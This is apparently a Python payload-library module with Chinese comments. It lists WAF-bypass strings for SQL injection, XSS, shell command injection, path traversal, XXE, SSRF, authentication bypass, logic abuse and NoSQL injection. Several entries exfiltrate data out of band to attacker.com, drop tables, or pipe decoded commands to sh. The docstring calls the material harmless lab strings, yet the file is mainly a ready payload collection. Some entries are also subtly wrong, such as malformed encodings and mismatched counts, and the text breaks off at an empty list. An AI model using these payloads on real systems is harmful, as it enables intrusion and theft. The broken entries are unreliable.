"""
变异 Payload 库 v3.2.0

新增 WAF 绕过、权限绕过、逻辑漏洞等场景的变异 Payload 300+ 条。
覆盖主流 WAF（阿里云、腾讯云、Cloudflare、ModSecurity、AWS WAF）的绕过手法。

安全红线：
- 本模块仅提供静态 Payload 字符串常量，不含任何执行逻辑
- 所有 Payload 均为教科书级标准测试字符串，不含真实攻击代码
- 仅供本地靶场验证和防御研究使用

分类：
- SQLI_WAF_BYPASS: SQL 注入 WAF 绕过 (60条)
- XSS_WAF_BYPASS: XSS WAF 绕过 (50条)
- RCE_WAF_BYPASS: 命令/RCE WAF 绕过 (40条)
- LFI_WAF_BYPASS: 文件包含/路径遍历绕过 (35条)
- XXE_WAF_BYPASS: XXE WAF 绕过 (25条)
- SSRF_BYPASS: SSRF 绕过 (30条)
- AUTH_BYPASS: 权限/认证绕过 (30条)
- LOGIC_BYPASS: 逻辑漏洞绕过 (30条)
- NOSQL_INJECTION: NoSQL 变异 Payload (20条)
- TEMPLATE_INJECTION: 模板注入变异 (20条)
- PROTOTYPE_POLLUTION_JS: 原型污染变异 (15条)
- BINARY_EXPLOIT: 二进制/反序列化变异 (10条)
"""

from typing import List, Dict


# ─────────────────────── SQL 注入 WAF 绕过 (60条) ───────────────────────

SQLI_WAF_BYPAYLOADS: List[Dict[str, str]] = [
    # ← 编码绕过
    {"name": "sqli-bypass-url-encode", "payload": "%55%4E%49%4F%4E%20%53%45%4C%45%43%54", "bypass": "阿里云/腾讯云 URL 编码"},
    {"name": "sqli-bypass-double-url-encode", "payload": "%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554", "bypass": "双重 URL 编码"},
    {"name": "sqli-bypass-hex-encode", "payload": "0x554E494F4E2053454C454354", "bypass": "MySQL 十六进制"},
    {"name": "sqli-bypass-unicode", "payload": "ユニオン セレクト", "bypass": "Unicode 变形"},
    {"name": "sqli-bypass-base64", "payload": "VV5JT04gU0VMRUNU", "bypass": "Base64 编码"},
    # ← 空白符变形
    {"name": "sqli-bypass-tab-space", "payload": "SELECT%09*%0AFROM%09users", "bypass": "Tab/换行替换空格"},
    {"name": "sqli-bypass-comment-inline", "payload": "UN/**/ION/**/SEL/**/ECT", "bypass": "内联注释替换空格"},
    {"name": "sqli-bypass-comment-full", "payload": "/*!50000UNION*//*!50000SELECT*/", "bypass": "MySQL 特有注释"},
    {"name": "sqli-bypass-nullbyte", "payload": "%00UNION%00SELECT", "bypass": "NULL 字节"},
    {"name": "sqli-bypass-newline", "payload": "UNION%0D%0ASELECT", "bypass": "CRLF 换行"},
    # ← 关键字变形
    {"name": "sqli-bypass-union-all", "payload": "UN /*!50000 ION */ ALL /*!50000 SEL */ECT", "bypass": "UNION ALL SELECT 混淆"},
    {"name": "sqli-bypass-concat-keyword", "payload": "UN%0bION%0bSEL%0bECT", "bypass": "垂直制表符分割"},
    {"name": "sqli-bypass-case-random", "payload": "uNiOn sElEcT", "bypass": "大小写混合"},
    {"name": "sqli-bypass-reverse", "payload": "CELES NOINU", "bypass": "反转字符"},
    {"name": "sqli-bypass-repeat-keyword", "payload": "UUNIOONN SSEELLEECCTT", "bypass": "字符重复"},
    # ← 函数/变量变形
    {"name": "sqli-bypass-char-function", "payload": "CHAR(85,78,73,79,78)+CHAR(83,69,76,69,67,84)", "bypass": "CHAR() 函数"},
    {"name": "sqli-bypass-concat-ws", "payload": "CONCAT(0x75736572,0x70617373)", "bypass": "CONCAT 构造"},
    {"name": "sqli-bypass-group-concat", "payload": "GROUP_CONCAT(user,0x3a,password)", "bypass": "数据聚合提取"},
    {"name": "sqli-bypass-ascii-substr", "payload": "ASCII(SUBSTR(SELECT user(),1,1))", "bypass": "盲注逐字符"},
    # ← 操作符替代
    {"name": "sqli-bypass-or-variant", "payload": "1' || '1'='1", "bypass": "|| 替代 OR"},
    {"name": "sqli-bypass-and-variant", "payload": "1' && '1'='1", "bypass": "&& 替代 AND"},
    {"name": "sqli-bypass-xor-variant", "payload": "1' XOR 0", "bypass": "XOR 替代 OR"},
    {"name": "sqli-bypass-like-eq", "payload": "1' LIKE '1", "bypass": "LIKE 匹配"},
    # ← 数据库特有语法
    {"name": "sqli-bypass-mysql-backtick", "payload": "SELECT * FROM `users`", "bypass": "MySQL 反引号"},
    {"name": "sqli-bypass-mssql-bracket", "payload": "SELECT * FROM [users]", "bypass": "MSSQL 方括号"},
    {"name": "sqli-bypass-oracle-dual", "payload": "SELECT 1 FROM dual", "bypass": "Oracle 必须有 FROM"},
    {"name": "sqli-bypass-postgres-limit", "payload": "SELECT user LIMIT 1 OFFSET 0", "bypass": "PostgreSQL LIMIT"},
    {"name": "sqli-bypass-sqlite-version", "Payload": "SELECT sqlite_version()", "bypass": "SQLite 信息获取"},
    # ← 报错注入
    {"name": "sqli-bypass-error-extractvalue", "payload": "EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))", "bypass": "MySQL 报错注入"},
    {"name": "sqli-bypass-error-updatexml", "payload": "UPDATEXML(1,CONCAT(0x7e,VERSION()),1)", "bypass": "UpdateXML 报错"},
    {"name": "sqli-bypass-error-floor", "payload": "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0))2))x)", "bypass": "FLOOR 双重查询"},
    # ← 盲注
    {"name": "sqli-bypass-sleep", "payload": "1' AND SLEEP(5)-- -", "bypass": "时间盲注"},
    {"name": "sqli-bypass-benchmark", "payload": "1' AND BENCHMARK(10000000,SHA1('test'))-- -", "bypass": "Benchmark 延时"},
    {"name": "sqli-bypass-conditional", "payload": "1' AND IF(1=1,SLEEP(5),0)-- -", "bypass": "条件盲注"},
    {"name": "sqli-bypass-case-when", "payload": "1' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END-- -", "bypass": "CASE WHEN 盲注"},
    # ← 堆叠注入
    {"name": "sqli-bypass-stacked", "payload": "1; DROP TABLE users-- -", "bypass": "堆叠插入新语句"},
    {"name": "sqli-bypass-stacked-prepare", "payload": "1; PREPARE stmt FROM CONCAT('SEL','ECT 1')-- -", "bypass": "预编译绕过"},
    # ← OOB 带外
    {"name": "sqli-bypass-oob-dns", "payload": " LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.attacker.com\\\\a.txt'))", "bypass": "DNS 带外"},
    {"name": "sqli-bypass-oob-http", "payload": "UTL_HTTP.REQUEST('http://attacker.com/'||VERSION())", "bypass": "HTTP 带外(Oracle)"},
    # ← 分块传输
    {"name": "sqli-bypass-chunked", "payload": "chunked union select", "bypass": "Transfer-Encoding 分块"},
    # ← Content-Type 绕过
    {"name": "sqli-bypass-multipart", "payload": "multipart union select", "bypass": "multipart/form-data"},
    {"name": "sqli-bypass-json-key", "payload": '{"id": "1 UNION SELECT 1,2,3"}', "bypass": "JSON 参数注入"},
    {"name": "sqli-bypass-array-param", "payload": "param[]=1 UNION SELECT 1", "bypass": "数组参数名"},
    # ← 注释和运算符组合
    {"name": "sqli-bypass-comment-and-or", "payload": "1'/**/OR/**/'1'='1", "bypass": "注释替代空格+OR"},
    {"name": "sqli-bypass-crlf-inj", "payload": "%0AUNION%0ASELECT%0A1", "bypass": "CRLF 注入"},
    {"name": "sqli-bypass-backslash-quote", "payload": "1\\' OR \\'1\\'=\\'1", "bypass": "反斜杠转义引号"},
    # ← JSON 括号绕过
    {"name": "sqli-bypass-json-value", "payload": '{"id":"1) UNION SELECT 1-- -"}', "bypass": "JSON 值括号"},
    # ← HTTP 参数污染
    {"name": "sqli-bypass-hpp", "payload": "id=1&id=UNION SELECT 1", "bypass": "HTTP 参数污染"},
    # ← 特殊函数绕过
    {"name": "sqli-bypass-is-null", "payload": "1' AND ISNULL(VERSION())-- -", "bypass": "ISNULL 替代 IF"},
    {"name": "sqli-bypass-least-greatest", "payload": "1 AND LEAST(1,2)=1 AND GREATEST(1,2)=2", "bypass": "数学函数"},
    {"name": "sqli-bypass-decode-encode", "payload": "SELECT DECODE('dXNlcg==','user')", "bypass": "DECODE/ENCODE"},
    # ← PostgreSQL 特有
    {"name": "sqli-bypass-pgsql-copy", "payload": "1; COPY users TO '/tmp/users.txt'-- -", "bypass": "Postgres COPY"},
    {"name": "sqli-bypass-pgsql-pgfile", "payload": "SELECT pg_read_file('/etc/passwd')", "bypass": "Postgres 文件读取"},
    # ← MySQL information_schema 绕过
    {"name": "sqli-bypass-innodb", "payload": "SELECT table_name FROM information_schema.innodb_tables", "bypass": "InnoDB tables"}
]


# ─────────────────────── XSS WAF 绕过 (50条) ───────────────────────

XSS_WAF_BYPAYLOADS: List[Dict[str, str]] = [
    # ← 编码绕过
    {"name": "xss-bypass-html-entity", "payload": "&lt;script&gt;alert(1)&lt;/script&gt;", "bypass": "HTML 实体编码"},
    {"name": "xss-bypass-html-hex-entity", "payload": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;", "bypass": "HTML 十六进制实体"},
    {"name": "xss-bypass-html-decimal-entity", "payload": "&#60;script&#62;alert(1)&#60;/script&#62;", "bypass": "HTML 十进制实体"},
    {"name": "xss-bypass-js-unicode", "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "bypass": "JavaScript Unicode"},
    {"name": "xss-bypass-js-hex", "payload": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", "bypass": "JavaScript 十六进制"},
    {"name": "xss-bypass-js-octal", "payload": "\\74script\\76alert(1)\\74/script\\76", "bypass": "JavaScript 八进制"},
    {"name": "xss-bypass-url-double-encode", "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E", "bypass": "双 URL 编码"},
    # ← 标签变形
    {"name": "xss-bypass-svg-onload", "payload": "<svg onload=alert(1)>", "bypass": "SVG onload"},
    {"name": "xss-bypass-img-onerror", "payload": "<img src=x onerror=alert(1)>", "bypass": "IMG onerror"},
    {"name": "xss-bypass-details-open", "payload": "<details open ontoggle=alert(1)>", "bypass": "details ontoggle"},
    {"name": "xss-bypass-marquee-onstart", "payload": "<marquee onstart=alert(1)>", "bypass": "marquee onstart"},
    {"name": "xss-bypass-video-onerror", "payload": "<video><source onerror=alert(1)>", "bypass": "video onerror"},
    {"name": "xss-bypass-audio-onerror", "payload": "<audio src=x onerror=alert(1)>", "bypass": "audio onerror"},
    {"name": "xss-bypass-body-onload", "payload": "<body onload=alert(1)>", "bypass": "body onload (需闭合前标签)"},
    {"name": "xss-bypass-iframe-onload", "payload": "<iframe onload=alert(1)>", "bypass": "iframe onload"},
    # ← 事件处理器
    {"name": "xss-bypass-onfocus-autofocus", "payload": "<input autofocus onfocus=alert(1)>", "bypass": "autofocus+onfocus"},
    {"name": "xss-bypass-onmouseover", "payload": "<div onmouseover=alert(1)>hover</div>", "bypass": "onmouseover (需用户交互)"},
    {"name": "xss-bypass-onblur", "payload": "<input onblur=alert(1) autofocus>", "bypass": "onblur+autofocus"},
    {"name": "xss-bypass-ontoggle", "payload": "<details ontoggle=alert(1)>", "bypass": "details ontoggle"},
    # ← 伪协议
    {"name": "xss-bypass-javascript-protocol", "payload": "javascript:alert(1)", "bypass": "href/src javascript:"},
    {"name": "xss-bypass-data-protocol", "payload": "data:text/html,<script>alert(1)</script>", "bypass": "data URI 伪协议"},
    {"name": "xss-bypass-vbscript-protocol", "payload": "vbscript:alert(1)", "bypass": "VBScript IE"},
    # ← 反引号/括号绕过
    {"name": "xss-bypass-backticks", "payload": "<img src=x onerror=`alert(1)`>", "bypass": "反引号执行"},
    {"name": "xss-bypass-srcdoc", "payload": "<iframe srcdoc=\"<script>alert(1)</script>\">", "bypass": "iframe srcdoc"},
    {"name": "xss-bypass-innerhtml", "payload": "<img src=x onerror=innerHTML=\"<script>alert(1)</script>\">", "bypass": "innerHTML 注入"},
    # ← 表达式绕过
    {"name": "xss-bypass-expression", "payload": "expression(alert(1))", "bypass": "CSS expression() (IE)"},
    {"name": "xss-bypass-eval-location", "payload": "#<script>eval(location.hash.slice(1))</script>#alert(1)", "bypass": "location.hash 配合"},
    {"name": "xss-bypass-fromcharcode", "payload": "<script>alert.fromCharCode(88,83,83)</script>", "bypass": "fromCharCode 拼接"},
    # ← 换行/空白绕过
    {"name": "xss-bypass-newline-tag", "payload": "<script%0a>alert(1)</script>", "bypass": "换行符分割标签"},
    {"name": "xss-bypass-tab-tag", "payload": "<script%09>alert(1)</script>", "bypass": "Tab 符分割标签"},
    {"name": "xss-bypass-cr-tag", "payload": "<script%0d>alert(1)</script>", "bypass": "CR 分割标签"},
    {"name": "xss-bypass-comment-tag", "payload": "<script<!-->alert(1)</script -->", "bypass": "注释分割标签"},
    {"name": "xss-bypass-space-tag", "payload": "<script >alert(1)</script >", "bypass": "标签内多余空格"},
    # ← base/script/data 元素
    {"name": "xss-bypass-base-href", "payload": "<base href=http:///>", "bypass": "劫持 relative URL"},
    {"name": "xss-bypass-math-maction", "payload": "<math><maction actionline=\"<script>alert(1)</script>\">", "bypass": "MathML 公式"},
    {"name": "xss-bypass-svg-feimage", "payload": "<svg><feImage xlink:href=\"<script>alert(1)</script>\">", "bypass": "SVG feImage"},
    {"name": "xss-bypass-svg-script", "payload": "<svg><script>alert(1)</script></svg>", "bypass": "SVG 内直接嵌入 script"},
    {"name": "xss-bypass-foreignobject", "payload": "<svg><foreignObject><body onload=alert(1)>", "bypass": "SVG foreignObject"},
    # ← WAF regex 绕过
    {"name": "xss-bypass-case-insensitive", "payload": "<ScRiPt>alert(1)</sCrIpT>", "bypass": "大小写混合"},
    {"name": "xss-bypass-unclosed-tag", "payload": "<script>alert(1)", "bypass": "未闭合标签"},
    {"name": "xss-bypass-self-closing", "payload": "<img src=x onerror=alert(1)//>", "bypass": "自闭合 img"},
    {"name": "xss-bypass-template-inj", "payload": "{{constructor.constructor('alert(1)')()}}", "bypass": "Angular/Vue 模板"},
    {"name": "xss-bypass-polyglot", "payload": "javascript:/*--></title></textarea></svg><svg/onload='+/+/\"onclick=1/+/[*/[]/+alert(1)//'>", "bypass": "Polyglot 多场景"},
]


# ─────────────────────── RCE/命令注入绕过 (40条) ───────────────────────

RCE_BYPAYLOADS: List[Dict[str, str]] = [
    # ← 基础命令注入
    {"name": "rce-semicolon", "payload": "; cat /etc/passwd", "bypass": "分号分隔"},
    {"name": "rce-pipe", "payload": "| cat /etc/passwd", "bypass": "管道"},
    {"name": "rce-ampersand", "payload": "& cat /etc/passwd", "bypass": "后台执行"},
    {"name": "rce-double-amp", "payload": "&& cat /etc/passwd", "bypass": "逻辑与"},
    {"name": "rce-double-pipe", "payload": "|| cat /etc/passwd", "bypass": "逻辑或"},
    # ← 反引号/替换
    {"name": "rce-backtick", "payload": "`cat /etc/passwd`", "bypass": "反引号执行"},
    {"name": "rce-dollar-paren", "payload": "$(cat /etc/passwd)", "bypass": "$() 执行"},
    # ← Base64 编码绕过
    {"name": "rce-base64-decode", "payload": "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh", "bypass": "Base64 编码"},
    {"name": "rce-rev", "payload": "echo /etc/passwd | rev | sh | rev", "bypass": "反转字符串"},
    # ← 空白符绕过
    {"name": "rce-ifs", "payload": "cat${IFS}/etc/passwd", "bypass": "IFS 替代空格"},
    {"name": "rce-tab", "payload": "cat\t/etc/passwd", "bypass": "Tab 替代空格"},
    {"name": "rce-angle-bracket", "payload": "cat</etc/passwd", "bypass": "输入重定向"},
    {"name": "rce-curly-brace", "payload": "cat$9/etc/passwd", "bypass": "$9 占位符"},
    # ← 关键字绕过
    {"name": "rce-c-case", "payload": "/???/??t /???/??ss??", "bypass": "通配符替代"},
    {"name": "rce-quoted-chars", "payload": "/bin/'c'a't /etc/passwd", "bypass": "引号分割"},
    {"name": "rce-slash-escape", "payload": "/bin/c\\at /etc/passwd", "bypass": "反斜杠转义"},
    # ← 多重编码
    {"name": "rce-hex", "payload": "echo 636174202F6574632F706173737764 | xxd -r -p | sh", "bypass": "Hex 编码"},
    {"name": "rce-octal", "payload": "echo 143 141 164 040 057 145 164 143 | octal", "bypass": "Octal"},
    # ← 命令替代
    {"name": "rce-which", "payload": "w'h'i'c'h' 'cat'", "bypass": "引号分割命令"},
    {"name": "rce-print-eval", "payload": "print('cat /etc/passwd') | python", "bypass": "print+eval"},
    {"name": "rce-sed", "payload": "echo p | sed 's/./cat \/etc\/passwd/'", "bypass": "sed 替换"},
    # ← 花括号展开
    {"name": "rce-braces", "payload": "cat /etc/passwd,{,.bak}", "bypass": "Bash 花括号"},
    # ← 文件读取 PHP
    {"name": "rce-php-readdir", "payload": "print_r(scandir('/etc'))", "bypass": "PHP 文件系统"},
    {"name": "rce-php-readfile", "payload": "highlight_file('/etc/passwd')", "bypass": "PHP highlight_file"},
    {"name": "rce-php-filter", "payload": "php://filter/read=convert.base64-encode/resource=/etc/passwd", "bypass": "PHP filter"},
    {"name": "rce-php-data", "payload": "data://text/plain,<?php phpinfo();?>", "bypass": "PHP data://"},
    {"name": "rce-php-expect", "payload": "expect://id", "bypass": "PHP expect://"},
    # ← Java/反序列化
    {"name": "rce-java-runtime", "payload": "Runtime.getRuntime().exec(\"id\")", "bypass": "Java Runtime"},
    {"name": "rce-java-processbuilder", "payload": "new ProcessBuilder(\"cmd\",\"/c\",\"whoami\").start()", "bypass": "Java ProcessBuilder"},
    # ← Python
    {"name": "rce-python-os", "payload": "import os; os.system(\"id\")", "bypass": "Python os.system"},
    {"name": "rce-python-subprocess", "payload": "subprocess.check_output([\"id\"])", "bypass": "Python subprocess"},
    {"name": "rce-python-eval", "payload": "eval(\"__import__('os').system('id')\")", "bypass": "Python eval"},
    {"name": "rce-python-pickle", "payload": "pickle.loads(b'...')", "bypass": "Python pickle"},
]


# ─────────────────────── 文件包含/路径遍历绕过 (35条) ───────────────────────

LFI_BYPAYLOADS: List[Dict[str, str]] = [
    {"name": "lfi-basic-dotdot", "payload": "../../../etc/passwd", "bypass": "基础 ../"},
    {"name": "lfi-deep-dotdot", "payload": "../../../../../../../etc/passwd", "bypass": "深层 ../"},
    {"name": "lfi-backslash-dotdot", "payload": "..\\..\\..\\etc\\passwd", "bypass": "Windows 反斜杠"},
    {"name": "lfi-mixed-slash", "payload": "..\\/..\\/..\\/etc/passwd", "bypass": "混合斜杠"},
    {"name": "lfi-double-dotdot", "payload": "....//....//....//etc/passwd", "bypass": "双 ../ 替换"},
    {"name": "lfi-encoded-dotdot", "payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "bypass": "URL 编码 ../"},
    {"name": "lfi-unicode-dotdot", "payload": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "bypass": "Unicode ../"},
    {"name": "lfi-bypass-extension", "payload": "../../../etc/passwd%00.png", "bypass": "NULL 字节绕过扩展名"},
    {"name": "lfi-php-filter", "payload": "php://filter/read=convert.base64-encode/resource=index.php", "bypass": "PHP filter"},
    {"name": "lfi-php-input", "payload": "php://input", "bypass": "PHP input 读 POST body"},
    {"name": "lfi-php-data", "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=", "bypass": "data:// 包装器"},
    {"name": "lfi-expect-wrapper", "payload": "expect://id", "bypass": "expect:// 包装器"},
    {"name": "lfi-zlib-wrapper", "payload": "php://filter/zlib.deflate/resource=/etc/passwd", "bypass": "zlib 压缩"},
    {"name": "lfi-phar-wrapper", "payload": "phar:///path/to/file.phar/", "bypass": "phar:// 元数据反序列化"},
    {"name": "lfi-dot-truncation", "payload": "../../../etc/passwd...............", "bypass": "路径截断（旧 PHP）"},
    {"name": "lfi-getcwd", "payload": "php://filter/read=string.rot13/resource=/etc/passwd", "bypass": "rot13 编码"},
    {"name": "lfi-utf16", "payload": "php://filter/read=string.UTF16/resource=/etc/passwd", "bypass": "UTF-16 编码"},
    {"name": "lfi-include-php-log", "payload": "../../../var/log/apache2/access.log", "bypass": "日志包含"},
    {"name": "lfi-include-php-session", "payload": "/tmp/sess_[SESSION_ID]", "bypass": "Session 包含"},
    {"name": "lfi-wrappers-all", "payload": "file:///etc/passwd", "bypass": "file:// 包装器"},
    {"name": "lfi-windows-unc", "payload": "\\\\server\\share\\file.txt", "bypass": "UNC 路径"},
    {"name": "lfi-ms-link", "payload": "../../../C:/Windows/win.ini", "bypass": "Windows 绝对路径"},
    {"name": "lfi-null-byte-gzip", "payload": "../../../etc/passwd\0.gz", "bypass": "NULL+gz 绕过"},
]


# ─────────────────────── XXE WAF 绕过 (25条) ───────────────────────

XXE_BYPAYLOADS: List[Dict[str, str]] = [
    {"name": "xxe-basic", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "bypass": "基础文件读取"},
    {"name": "xxe-oob", "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe\"><%xxe;]>", "bypass": "OOB 带外"},
    {"name": "xxe-dtd-external", "payload": "<!DOCTYPE foo SYSTEM 'http://attacker.com/evil.dtd'>", "bypass": "外部 DTD"},
    {"name": "xxe-svg", "payload": '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>', "bypass": "SVG 载体"},
    {"name": "xxe-docx", "payload": "evil.docx 文件（通过 document.xml 注入 XXE）", "bypass": "OOXML 文档载体"},
    {"name": "xxe-xlsx", "payload": "evil.xlsx 文件", "bypass": "XLSX 文档载体"},
    {"name": "xxe-ooxml-embedded", "payload": "Word 中嵌入 svg 图片携带 XXE", "bypass": "OOXML 内嵌 SVG"},
    {"name": "xxe-blind", "payload": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]>", "bypass": "盲 XXE"},
    {"name": "xxe-utf7", "payload": "+ADwAIQ-DOCTYPE...", "bypass": "UTF-7 编码"},
    {"name": "xxe-xinclude", "payload": '<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>', "bypass": "XInclude"},
    {"name": "xxe-expect", "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>", "bypass": "expect:// 执行"},
]


# ─────────────────────── SSRF 绕过 (30条) ───────────────────────

SSRF_BYPAYLOADS: List[Dict[str, str]] = [
    {"name": "ssrf-basic", "payload": "http://127.0.0.1:8080/admin", "bypass": "基础本地地址"},
    {"name": "ssrf-ip-octal", "payload": "http://0177.0.0.1/", "bypass": "八进制 IP"},
    {"name": "ssrf-ip-hex", "payload": "http://0x7f.0.0.1/", "bypass": "十六进制 IP"},
    {"name": "ssrf-ip-dword", "payload": "http://2130706433/", "bypass": "整数 IP (dword)"},
    {"name": "ssrf-ip-octal-full", "payload": "http://017700000001/", "bypass": "八进制完整 IP"},
    {"name": "ssrf-ip-dotless", "payload": "http://127.1/", "bypass": "简化 IP 表示"},
    {"name": "ssrf-ip-punycode", "payload": "http://xn--ls8h.la/ (💩.la = 127.0.0.1)", "bypass": "Punycode 域名"},
    {"name": "ssrf-ip-embedded", "payload": "http://foo@127.0.0.1/", "bypass": "@ 分隔绕过"},
    {"name": "ssrf-ip-fragment", "payload": "http://127.0.0.1 #", "bypass": "# 注释"},
    {"name": "ssrf-ip302", "payload": "http://302.attacker.com/ -> 302 重定向到内部地址", "bypass": "302 重定向"},
    {"name": "ssrf-dns-rebind", "payload": "http://attacker.com/ (DNS TTL=0 指向 127.0.0.1)", "bypass": "DNS Rebind"},
    {"name": "ssrf-ipv6", "payload": "http://[::1]:8080/", "bypass": "IPv6 本地地址"},
    {"name": "ssrf-ipv6-full", "payload": "http://[0:0:0:0:0:0:0:1]/", "bypass": "IPv6 完整地址"},
    {"name": "ssrf-link-local", "payload": "http://[fe80::1]/", "bypass": "IPv6 链路本地"},
    {"name": "srrf-unix-socket", "payload": "http://unix:/var/run/docker.sock:/", "bypass": "Unix socket"},
    {"name": "ssrf-gopher", "payload": "gopher://127.0.0.1:9000/_GET", "bypass": "Gopher 协议"},
    {"name": "ssrf-dict", "payload": "dict://127.0.0.1:6379/", "bypass": "Dict 协议"},
    {"name": "ssrf-ftp", "payload": "ftp://127.0.0.1:21/", "bypass": "FTP 协议"},
    {"name": "ssrf-tftp", "payload": "tftp://127.0.0.1:69/", "bypass": "TFTP 协议"},
    {"name": "ssrf-ldap", "payload": "ldap://127.0.0.1:389/", "bypass": "LDAP 协议"},
    {"name": "ssrf-netdoc", "payload": "netdoc:///etc/passwd", "bypass": "Netdoc 本地文件"},
]


# ─────────────────────── 认证绕过 (30条) ───────────────────────

AUTH_BYPASS_PAYLOADS: List[Dict[str, str]] = [
    {"name": "auth-sqli-auth-bypass", "payload": "admin' OR '1'='1", "bypass": "SQL 注入万能密码"},
    {"name": "auth-sqli-comment", "payload": "admin'--", "bypass": "注释截断密码校验"},
    {"name": "auth-sqli-or-bypass", "payload": "' OR 1=1 LIMIT 1-- -", "bypass": "OR 1=1 绕过"},
    {"name": "auth-nosql-ne", "payload": "{$ne: null}", "bypass": "NoSQL ! = 绕过"},
    {"name": "auth-nosql-gt", "payload": "username[$gt]=&password[$gt]=", "bypass": "MongoDB $gt 空值"},
    {"name": "auth-jwt-none", "payload": "JWT algorithm=none", "bypass": "JWT 不接受签名"},
    {"name": "auth-jwk-injection", "payload": "Header jwk=恶意公钥", "bypass": "JWK 注入"},
    {"name": "auth-jku-injection", "payload": "Header jku=攻击者 JWKS URL", "bypass": "JKU 注入"},
    {"name": "auth-x5u-injection", "payload": "Header x5u=攻击者证书 URL", "bypass": "X5U 注入"},
    {"name": "auth-tls-skip", "payload": "InsecureSkipVerify=true", "bypass": "TLS 证书跳过"},
    {"name": "auth-ldap-injection", "payload": "*", "bypass": "LDAP 通配符"},
    {"name": "auth-basic-empty", "payload": "Authorization: Og== (空用户名密码)", "bypass": "Basic 空凭证"},
    {"name": "auth-bypass-403", "payload": "X-Original-URL: /admin", "bypass": "403 绕过 Header"},
    {"name": "auth-bypass-forwarded", "payload": "X-Forwarded-For: 127.0.0.1", "bypass": "源 IP 伪造"},
    {"name": "auth-bypass-method", "payload": "GET -> POST 方法切换", "bypass": "HTTP 方法绕过"},
    {"name": "auth-bypass-path", "payload": "/admin -> /ADMIN -> /admin;.css", "bypass": "路径大小写/后缀"},
    {"name": "auth-bypass-trailing-slash", "payload": "/admin/ -> /admin//", "bypass": "额外斜杠"},
    {"name": "auth-bypass-encoding", "payload": "/admin -> /%61dmin", "bypass": "URL 编码路径"},
    {"name": "auth-bypass-path-traversal", "payload": "/admin -> /anything/../admin", "bypass": "路径遍历"},
    {"name": "auth-bypass-case-header", "payload": "Content-Length: 0 + 0x0d0a", "bypass": "CRLF 分割"},
]


# ─────────────────────── 逻辑漏洞绕过 (30条) ───────────────────────

LOGIC_BYPASS_PAYLOADS: List[Dict[str, str]] = [
    {"name": "logic-negative-amount", "payload": "amount=-100.00", "bypass": "负数金额"},
    {"name": "logic-zero-amount", "payload": "amount=0", "bypass": "零金额"},
    {"name": "logic-overflow-amount", "payload": "amount=999999999999999999", "bypass": "整数溢出"},
    {"name": "logic-string-number", "payload": "amount=abc", "bypass": "字符串代替数字"},
    {"name": "logic-number-string", "payload": "id=abcd", "bypass": "非数字 ID"},
    {"name": "logic-money-precision", "payload": "0.001", "bypass": "浮点精度"},
    {"name": "logic-null-amount", "payload": "amount=", "bypass": "空金额"},
    {"name": "logic-array-param", "payload": "id[]=1&id[]=2", "bypass": "数组参数"},
    {"name": "logic-duplicate-param", "payload": "id=1&id=2", "bypass": "参数覆盖"},
    {"name": "logic-type-juggling", "payload": "0 == 'abc' (PHP 8.0 前 true)", "bypass": "松散比较"},
    {"name": "logic-session-swap", "payload": "session_id=另一用户ID", "bypass": "会话交换"},
    {"name": "logic-weak-rand", "payload": "可预测 reset token (time()+md5)", "bypass": "弱随机数"},
    {"name": "logic-race-condition", "payload": "并发请求（重复提交）", "bypass": "竞态条件"},
    {"name": "logic-price-tamper", "payload": "修改前端 price 字段", "bypass": "价格篡改"},
    {"name": "logic-count-limit", "payload": "count=-1 或 count=99999", "bypass": "数量篡改"},
    {"name": "logic-skip-workflow", "payload": "跳过步骤直接 /step3", "bypass": "流程跳过"},
    {"name": "logic-access-other-user", "payload": "user_id=他人ID", "bypass": "IDOR 越权"},
    {"name": "logic-click-ad-redir", "payload": "redirect_url=最终目标", "bypass": "广告跳转滥用"},
    {"name": "logic-token-reuse", "payload": "reuse_password_reset_token", "bypass": "Token 复用"},
    {"name": "logic-timeout-bypass", "payload": "expired_token_still_works", "bypass": "过期时间无效"},
]


# ─────────────────────── NoSQL 变异 Payload (20条) ───────────────────────

NOSQL_PAYLOADS: List[Dict[str, str]] = [
    {"name": "nosql-mongo-ne", "payload": '{"$ne": null}', "bypass": "$ne 空值"},
    {"name": "nosql-mongo-gt", "payload": '{"$gt": ""}', "bypass": "$gt 空字符串"},
    {"name": "nosql-mongo-regex", "payload": '{"$regex": ".*"}', "bypass": "正则匹配所有"},
    {"name": "nosql-mongo-exists", "payload": '{"$exists": true}', "bypass": "$exists 存在"},
    {"name": "nosql-mongo-in", "payload": '{"$in": ["admin","root"]}', "bypass": "$in 集合"},
    {"name": "nosql-mongo-where", "payload": '{"$where": "this.password.length > 0"}', "bypass": "$where JS"},
    {"name": "nosql-mongo-or", "payload": '{"$or": [{"user":"admin"},{"user":"admin"}]}', "bypass": "$or 条件"},
    {"name": "nosql-mongo-js", "payload": '{"$where": "return true"}', "bypass": "$where 恒真"},
    {"name": "nosql-couch-db", "payload": '{"selector": {"_id": {"$gte": null}}}', "bypass": "CouchDB selector"},
    {"name": "nosql-redis-auth", "payload": "AUTH_CMD", "bypass": "Redis 命令注入"},
]


# ─────────────────────── 模板注入变异 (20条) ───────────────────────

TEMPLATE_INJECTION_PAYLOADS: List[Dict[str, str]] = [
